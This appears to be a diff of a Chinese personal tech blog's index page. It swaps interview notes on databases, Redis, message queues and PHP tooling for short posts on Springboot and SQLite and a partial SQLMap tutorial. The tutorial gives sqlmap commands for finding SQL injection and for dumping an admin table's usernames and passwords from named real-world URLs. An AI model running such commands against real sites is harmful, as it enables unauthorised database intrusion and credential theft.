-<li>多列索引（复合索引）：复合索引指多个字段上创建的索引，只有在查询条件中使用了创建索引时的第一个字段，索引才会被使用。使用复合索引时遵循最左前缀集合</li>
-<li>唯一索引或者非唯一索引</li>
-<li>空间索引：空间索引是对空间数据类型的字段建立的索引</li>
-</ul>
-<h4 id="3.3">主从-分区分表分库</h4>
-
-<ul>
-<li>分库：是为了解决数据库连接资源不足问题，和磁盘IO的性能瓶颈问题。</li>
-<li>分表：是为了解决单表数据量太大，sql语句查询数据时，即使走了索引也非常耗时问题。此外还可以解决消耗cpu资源问题。</li>
-<li>分库分表：可以解决 数据库连接资源不足、磁盘IO的性能瓶颈、检索数据耗时 和 消耗cpu资源等问题。</li>
-</ul>
-<p><a target="_blank" rel="noopener" href="https://github.com/DavidSuperM/davidsuperm.github.io/blob/master/DB/mysql%E5%88%86%E5%8C%BA%E5%88%86%E8%A1%A8%E5%88%86%E5%BA%93%E6%96%B9%E6%A1%88.md">https://github.com/DavidSuperM/davidsuperm.github.io/blob/master/DB/mysql%E5%88%86%E5%8C%BA%E5%88%86%E8%A1%A8%E5%88%86%E5%BA%93%E6%96%B9%E6%A1%88.md</a></p>
-<h4 id="3.4">如何定位慢查询</h4>
-
-<ol>
-<li>首先确认是否开启了慢查询</li>
-<li>设置慢查询的时间限制</li>
-<li>查询慢查询日志可定位具体的慢sql</li>
-<li>相关sql查询</li>
-<li>用Explain分析具体的sql语句</li>
-</ol>
-<h3 id="5">Redis</h3>
-<h4 id="5.2">Redis常见数据结构</h4>
-
-<p>最常用的的有5种,字符串(String)、哈希(Hash)、列表(list)、集合(set)、有序集合(ZSET)</p>
-<blockquote>
-<p>元素唯一性：set中不允许重复的成员，而zset中不允许重复的成员，但是允许不同成员拥有相同的分数</p>
-</blockquote>
-<h4 id="5.3">Redis缓存雪崩、缓存穿透、缓存击穿</h4>
-
-
-<ul>
-<li><p>缓存雪崩<br>大量用户请求，全部转向请求访问数据库，压力剧增，可能导致数据库宕机，造成系统崩溃，造成缓存雪崩</p>
-</li>
-<li><p>缓存击穿<br>业务中几个数据会频繁访问，比如秒杀数据，被称为热点数据<br>如果某个热点数据过期了，此时大量用户请求，无法从缓存中读取，直接访问数据库，造成系统奔溃，缓存击穿</p>
-</li>
-<li><p>缓存穿透<br>当用户访问数据，既不在缓存中，也不在数据库，导致请求缓存时，发现缓存缺失，发现两者都没找到，没法构建缓存，</p>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>缓存异常</th>
-<th>产生原因</th>
-<th>应对方案</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>缓存雪崩</td>
-<td>大量数据同时过期</td>
-<td>1.均匀设置过期时间 - 过期时间后加随机数，保证不会再同一时间过期 </br>  2.互斥锁 - 保证同一时间只有一个请求来构建缓存 </br> 3.后台更新缓存</td>
-</tr>
-<tr>
-<td></td>
-<td>Redis 故障宕机</td>
-<td>1.服务熔断或请求限流机制 </br>  2.构建 Redis 缓存高可靠集群</td>
-</tr>
-<tr>
-<td>缓存击穿</td>
-<td>热点数据过期</td>
-<td>1.互斥锁 </br> 2.不给热点数据设置过期时间，由后台异步更新缓存</td>
-</tr>
-<tr>
-<td>缓存穿透</td>
-<td>访问的数据既不在缓存，也不在数据库</td>
-<td>1.非法请求 </br> 2.缓存空值或者默认值 </br> 3.使用布隆过滤器快速判断数据是否存在</td>
-</tr>
-</tbody></table>
-<h4 id="5.4">Redis淘汰策略</h4>
-<h4 id="5.5">Redis分布式锁怎么实现</h4>
-<h4 id="5.6">Redis的持久化机制:RDB-vs-AOF</h4>
-<h4 id="5.7">Redis主从哨兵和集群的区别</h4>
-<h4 id="5.8">节点扩容不同</h4>
-
-
-<h3 id="6">MQ</h3>
-<h4 id="6.1">RabbitMQ,RocketMQ,Kafka区别</h4>
-
-
-<table>
-<thead>
-<tr>
-<th>MQ消息队列</th>
-<th>优点</th>
-<th>缺点</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>RabbitMQ</td>
-<td>轻量级、容易部署和使用、支持多种客户端开发语言、支持灵活的路由配置</td>
-<td>对消息堆积的支持并不好、性能和吞吐量较差、使用 Erlang 语言编写，比较难进行二次开发</td>
-</tr>
-<tr>
-<td>RocketMQ</td>
-<td>性能好、稳定可靠、有活跃的中文社区、使用 Java 开发，容易进行二次开发、特点响应快</td>
-<td>兼容性较差</td>
-</tr>
-<tr>
-<td>Kafka</td>
-<td>兼容性极好、设计上大量使用了批量和异步的思想，有超高的性能</td>
-<td>由于 “先攒一波再一起处理” 的设计，时延较高，不太适合在线业务场景</td>
-</tr>
-</tbody></table>
-<h3 id="7">服务器&其它方面</h3>
-<h4 id="7.1">swoole</h4>
-
-<p>Swoole是一个面向生产环境的PHP 异步网络通信引擎，使PHP 开发人员可以编写高性能的异步并发TCP、UDP、Unix Socket、HTTP，WebSocket 服务</p>
-<h4 id="7.2">phpunit</h4>
-
-<p>PHPUnit 是 PHP 程式语言中最常见的单元测试 (unit testing) 框架，PHPUnit 是参考 xUnit 架构利用 PHP 实作出来。</p>
-<ol>
-<li>针对类 Example 的测试写在类 ExampleTest 中, ExampleTest 继承自 TestCase</li>
-<li>对于方法的测试命名为 test* 的公用方法</li>
-<li>在测试方法内，类似于 assertEquals() 的断言方法用来对实际值和预期值的匹配做出验证</li>
-</ol>
-<h4 id="7.3">php-cs-fixer</h4>
-
-<p>php-cs-fixer 是个代码格式化工具，格式化的标准是 PSR-1、PSR-2 以及一些 symfony 的标准。</p>
-<ul>
-<li>–verbose 用于展示应用了的规则<blockquote>
-<p>–verbose</p>
-</blockquote>
-</li>
-<li>–using-cache 不使用缓存<blockquote>
-<p>–using-cache&#x3D;no</p>
-</blockquote>
-</li>
-<li>–config 指定配置文件<blockquote>
-<p>–config&#x3D;.php-cs-fixer.php</p>
-</blockquote>
-</li>
-<li>–level 用于控制需要使用的规则层级（默认psr2）<blockquote>
-<p>–level&#x3D;psr0<br>–level&#x3D;psr1<br>–level&#x3D;psr2<br>–level&#x3D;symfony</p>
-</blockquote>
-</li>
-<li>–fixers 默认情况下执行的是 PSR-2 的所有选项以及一些附加选项（主要是 symfony 相关的）。还有一些属于『贡献级别』的选项，你可以通过 –fixers 选择性的添加，–fixers 的多个条件要用逗号分开<blockquote>
-<p>–fixers&#x3D;linefeed,short_tag,indentation</p>
-</blockquote>
-</li>
-<li>-name_of_fixer 设定禁用哪些选项。如果同时设定了 –fixers 和 -name_of_fixer，前者的优先级更高</li>
-<li>–dry-run 和 –diff 可以显示出需要修改的汇总，但是并不实际修改<blockquote>
-<p>.&#x2F;vendor&#x2F;bin&#x2F;php-cs-fixer fix –verbose –diff –dry-run</p>
-</blockquote>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment"># vendor/bin/php-cs-fixer fix --config=.php-cs-fixer.dist.php --dry-run --diff</span></span><br><span class="line"><span class="comment"># vendor/bin/php-cs-fixer fix --config=.php-cs-fixer.dist.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$finder</span> = PhpCsFixer\Finder::create()</span><br><span class="line">    -&gt;<span class="keyword">in</span>(__DIR__)</span><br><span class="line">    -&gt;name(<span class="string">&#x27;*.php&#x27;</span>)</span><br><span class="line">    -&gt;notName(<span class="string">&#x27;*.blade.php&#x27;</span>); // 排除一些文件类型</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> (new PhpCsFixer\Config())</span><br><span class="line">    -&gt;setUsingCache(<span class="literal">false</span>)  // 禁用缓存</span><br><span class="line">    -&gt;setRules([</span><br><span class="line">        <span class="string">&#x27;@PSR12&#x27;</span> =&gt; <span class="literal">true</span>,                      // 使用 PSR-12 标准</span><br><span class="line">        <span class="string">&#x27;no_unused_imports&#x27;</span> =&gt; <span class="literal">true</span>,            // 移除未使用的导入</span><br><span class="line">        <span class="string">&#x27;standardize_not_equals&#x27;</span> =&gt; <span class="literal">true</span>,       // 使用 `!==` 而不是 `&lt;&gt;`</span><br><span class="line">        <span class="string">&#x27;array_indentation&#x27;</span> =&gt; <span class="literal">true</span>,            // 数组缩进一致</span><br><span class="line">        <span class="string">&#x27;binary_operator_spaces&#x27;</span> =&gt; [<span class="string">&#x27;default&#x27;</span> =&gt; <span class="string">&#x27;align&#x27;</span>],  // 二元运算符对齐</span><br><span class="line">        <span class="string">&#x27;no_extra_blank_lines&#x27;</span> =&gt; <span class="literal">true</span>,         // 删除多余空行</span><br><span class="line">        <span class="string">&#x27;visibility_required&#x27;</span> =&gt; [<span class="string">&#x27;elements&#x27;</span> =&gt; [<span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;method&#x27;</span>]],  // 强制声明可见性</span><br><span class="line">        <span class="string">&#x27;no_trailing_whitespace&#x27;</span> =&gt; <span class="literal">true</span>,       // 删除行尾空白</span><br><span class="line">        <span class="string">&#x27;linebreak_after_opening_tag&#x27;</span> =&gt; <span class="literal">true</span>,  // 在 PHP 开标签后换行</span><br><span class="line">        <span class="string">&#x27;cast_spaces&#x27;</span> =&gt; [<span class="string">&#x27;space&#x27;</span> =&gt; <span class="string">&#x27;single&#x27;</span>], // 类型转换间隔为单空格</span><br><span class="line">        <span class="string">&#x27;align_multiline_comment&#x27;</span> =&gt; <span class="literal">true</span>,      // 多行注释对齐</span><br><span class="line">        <span class="string">&#x27;ternary_operator_spaces&#x27;</span> =&gt; <span class="literal">true</span>,      // 三元运算符间空格</span><br><span class="line">        <span class="string">&#x27;no_blank_lines_after_phpdoc&#x27;</span> =&gt; <span class="literal">true</span>,  // PHPDoc 后不允许空行</span><br><span class="line">        <span class="string">&#x27;method_argument_space&#x27;</span> =&gt; [<span class="string">&#x27;on_multiline&#x27;</span> =&gt; <span class="string">&#x27;ensure_fully_multiline&#x27;</span>],  // 方法参数一致性</span><br><span class="line">    ])</span><br><span class="line">    -&gt;setFinder(<span class="variable">$finder</span>);</span><br></pre></td></tr></table></figure>
-
-<h4 id="7.4">docker多版本启动共用</h4>
-
+<h2 id="边缘计算架构"><a href="#边缘计算架构" class="headerlink" title="边缘计算架构"></a>边缘计算架构</h2><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7368505674224238607">引用</a><br><a target="_blank" rel="noopener" href="https://shaogefenhao.com/posts/architecture/roamap-of-system.html#%E9%9D%A2%E5%90%91%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%9E%B6%E6%9E%84-soa">引用</a></p>
 
         </div>
     
@@ -1113,8 +523,8 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/19/php-structure/">
-                PHP框架
+            <a href="/2026/09/19/springboot/">
+                Springboot
             </a>
         </h1>
         <div class="post-info">
@@ -1132,24 +542,8 @@
 
     
         <div class="content">
-            <h2 id="thinkpkp-讨论"><a href="#thinkpkp-讨论" class="headerlink" title="thinkpkp 讨论"></a>thinkpkp 讨论</h2><h3 id="thinkphp-6以上适用命令"><a href="#thinkphp-6以上适用命令" class="headerlink" title="thinkphp 6以上适用命令"></a>thinkphp 6以上适用命令</h3><ul>
-<li>创建单例</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think</span><br></pre></td></tr></table></figure>
-<ul>
-<li>创建多例</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require topthink/think-multi-app</span><br></pre></td></tr></table></figure>
-<ul>
-<li>创建两个模型</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php think build admin</span><br><span class="line">php think build api</span><br></pre></td></tr></table></figure>
-<ul>
-<li>创建多层试图</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require topthink/think-view</span><br></pre></td></tr></table></figure>
-
-
+            <p>文章</p>
+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h2 id="微服务-dubbo-zookeeper"><a href="#微服务-dubbo-zookeeper" class="headerlink" title="微服务 dubbo - zookeeper"></a>微服务 dubbo - zookeeper</h2><h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><h3 id="undertow-对比-tomcat"><a href="#undertow-对比-tomcat" class="headerlink" title="undertow 对比 tomcat"></a>undertow 对比 tomcat</h3>
         </div>
     
 
@@ -1160,160 +554,8 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/19/pressure-testing/">
-                压测工具集合
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/测试工具/">测试工具</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="并发请求处理"><a href="#并发请求处理" class="headerlink" title="并发请求处理"></a>并发请求处理</h1><ul>
-<li>HTTP&#x2F;HTTPS 接口：测试 Web API、RESTful 接口的吞吐量、QPS（每秒请求数）。</li>
-<li>数据库查询：高并发查询数据库，看是否会出现锁等待、死锁、超时等问题。</li>
-<li>后台任务：队列、定时任务（如 RabbitMQ、Kafka）在高负载下的稳定性。</li>
-</ul>
-<h2 id="k6"><a href="#k6" class="headerlink" title="k6"></a>k6</h2><p>k6 是一个压力测试套件，使用 golang 编写。主要特性有：</p>
-<ul>
-<li>提供了友好的 CLI 工具</li>
-<li>使用 JavaScript 代码编写测试用例</li>
-<li>可以根据性能条件设置阈值，表明成功还是失败</li>
-</ul>
-<p>k6 没有使用 nodejs 而是 golang 程序，通过包裹了一个 JavaScript 运行时来运行 JavaScript 脚本，因此不能直接使用 npm 包以及 Nodejs 提供的一些 API。</p>
-<p>同时，k6 在运行测试时，没有启动浏览器，主要用于测试页面以及 API 加载速度。k6 提供了通过网络请求（HAR）生成测试脚本的方法，实现更简便的测试脚本编写，以及 session 的维护。</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/19/python-interview/">
-                Golang 深浅
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/后端/">后端</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <!-- * [基础](#1)
-    * [进程、线程、Goroutine(协程)区别](#1.1)
-    * [make和new区别](#1.2)
-    * [数组和切片区别](#1.3)
-* [GMP协程调度器](#2)
-    * [调度器策略](#2.1)
-    * [调度器的生命周期](#2.2)
-* [并发 sync](#3)
-    * [通道 - channel](#3.1)
-    * [互斥锁 Mutex 与 读写锁 RWMutex 区别](#3.2)
-    * [并发Map - sync.Map](#3.3)
-    * [线程池 - sync.Pool](#3.4)
-* [内存](#4)
-    * [CG](#4.1)
-* [微服务之间通信方式 rpc Grpc http](#4) -->
-
-<h1 id="打包-pyinstalller"><a href="#打包-pyinstalller" class="headerlink" title="打包 pyinstalller"></a>打包 pyinstalller</h1><h2 id="单个文件打包"><a href="#单个文件打包" class="headerlink" title="单个文件打包"></a>单个文件打包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.执行命令</span></span><br><span class="line">pyinstaller -F xxx.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.去生成的dist文件夹找xxx.exe运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.运行成功，xxx.exe则为可执行文件，删除其它文件</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="打包多文件"><a href="#打包多文件" class="headerlink" title="打包多文件"></a>打包多文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.执行命令，xxx.py为程序入口文件</span></span><br><span class="line">pyinstall -D xxx.py </span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.删除生成的bulid和dist文件夹,仅保留xxx.spec文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.修改xxx.spec文件,详见2.2.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.执行命令</span></span><br><span class="line">pyinstaller -F xxx.spec</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.去dist文件夹下找xxx.exe文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.运行成功，删除临时文件目录build；dist目录为打包的结果，可执行文件和其它程序运行的关联文件都在这个目录</span></span><br></pre></td></tr></table></figure>
-
-
-<p>conda 和 venv 差不多</p>
-<p>1️⃣ venv（Python 自带虚拟环境）</p>
-<pre><code>作用：创建一个 隔离的 Python 环境，不影响系统 Python。
-
-仅管理 Python 包，不管底层 C 库或系统库。
-</code></pre>
-<p>2️⃣ conda（跨语言包 + 环境管理器）</p>
-<pre><code>作用：创建隔离环境 + 安装包 + 管理底层依赖
-
-不仅支持 Python，还支持 R、C/C++ 库。
-</code></pre>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/19/raspberry-pi/">
-                Raspberry Pi 树莓派
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/单片机/">单片机</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>树莓派的开发探索-基本篇 环境基于(Raspberry Pi OS)</p>
-<h2 id="单片机开发与探索"><a href="#单片机开发与探索" class="headerlink" title="单片机开发与探索"></a>单片机开发与探索</h2><h3 id="无需显示器连WIFI"><a href="#无需显示器连WIFI" class="headerlink" title="无需显示器连WIFI"></a>无需显示器连WIFI</h3><blockquote>
-<p>树莓派系统连接原理</p>
-<blockquote>
-<p>用户可以在未启动树莓派的状态下单独修改 <code>/boot/wpa_supplicant.conf</code> 文件配置 WiFi 的 SSID 和密码，这样树莓派启动后会自行读取 <code>wpa_supplicant.conf</code> 配置文件连接 WiFi 设备。</p>
-</blockquote>
-</blockquote>
-<ul>
-<li><p>制作树莓派系统(Raspberry Pi OS)在sd里面不多赘述</p>
-</li>
-<li><p>在电脑中打开sd卡根目录创建名字为wpa_supplicant.conf 的文件</p>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class="line">update_config=1</span><br><span class="line">network=&#123;</span><br><span class="line">	ssid=<span class="string">&quot;12345678&quot;</span></span><br><span class="line">	psk=<span class="string">&quot;88888888&quot;</span></span><br><span class="line">	key_mgmt=WPA-PSK</span><br><span class="line">	priority=1  <span class="comment"># 连接优先级，数字越大优先级越高（不可以是负数）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>开机启动树莓派即可连接WIFI</li>
-</ul>
-<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/19/redis/">
-                Redis
+            <a href="/2026/09/19/sqlite/">
+                SQLite
             </a>
         </h1>
         <div class="post-info">
@@ -1331,7 +573,838 @@
 
     
         <div class="content">
+            <h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进数据库</span></span><br><span class="line">sqlite3 /Users/mac/tabby.db</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看有哪些表</span></span><br><span class="line">.tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 user 表内容</span></span><br><span class="line">SELECT * FROM user;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出</span></span><br><span class="line">.quit</span><br></pre></td></tr></table></figure>
+
+        </div>
+    
+
+</div>
             
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/09/19/sqlmap/">
+                SQLMap
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/渗透工具/">渗透工具</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>文章</p>
+<h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><h3 id="分类文章"><a href="#分类文章" class="headerlink" title="分类文章"></a>分类文章</h3><h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	http://www.vuln.cn/1992<br />
+</h3>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	sqlmap简介
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap支持五种不同的注入模式：
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		4、联合查询注入，可以使用union的情况下的注入。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		5、堆查询注入，可以同时执行多条语句的执行时的注入。
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	sqlmap支持的数据库有
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
+</p>
+<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	检测注入
+</h2>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	基本格式
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1"
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	默认使用level1检测全部数据库类型
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	跟随302跳转
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br />
+当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br />
+目的就是：要追踪到错误信息。
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	cookie注入
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	当程序有防get注入的时候，可以使用cookie注入<br />
+sqlmap -u "http://www.baidu.com/shownews.asp" --cookie "id=11" --level 2（只有level达到2才会检测cookie）
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	从post数据包中注入
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	可以使用burpsuite或者temperdata等工具来抓取post包
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -r "c:\tools\request.txt" -p "username" --dbms mysql &nbsp; &nbsp;指定username参数
+</p>
+<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	注入成功后
+</h2>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	获取数据库基本信息
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 --dbs
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	查询有哪些数据库
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test --tables
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	查询test数据库中有哪些表
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test -T admin --columns
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	查询test数据库中admin表有哪些字段
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test -T admin -C "username,password" --dump
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	dump出字段username与password中的数据
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	其他命令参考下面
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	从数据库中搜索字段
+</h3>
